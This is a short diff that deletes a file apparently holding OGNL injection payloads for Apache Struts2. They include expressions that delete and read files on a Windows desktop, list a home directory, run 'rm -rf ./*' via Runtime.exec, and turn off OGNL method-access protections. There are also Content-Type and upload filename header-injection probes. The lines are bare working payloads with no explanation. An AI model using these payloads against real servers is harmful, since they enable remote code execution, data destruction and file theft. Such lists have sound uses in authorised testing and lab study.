@@ -1,9 +1,0 @@
-%{#f=newjava.io.File("C:\\Users\\hp\\Desktop\\关键字1.txt"),#f.delete()}
-%{#f=newjava.io.FileReader("C:\\Users\\hp\\Desktop\\关键字.txt"),#a=newchar[1024],#f.read(#a,0,1024),newjava.lang.String(#a)}
-Content-Type:%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
-%{#a=newjava.io.File("~"),#a.list()}
-%{#a=newjava.lang.Runtime().exec("rm-rf./*")}
-%{#_memberAccess.allowStaticMethodAccess=true,@java.io.BufferedInputStream@close()}
-%{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.io.InputStreamReader@close()}
-%{#_memberAccess.allowStaticMethodAccess=true,@java.io.LineNumberReader@readLine()}
-Content-Disposition:form-data;name="upload";filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
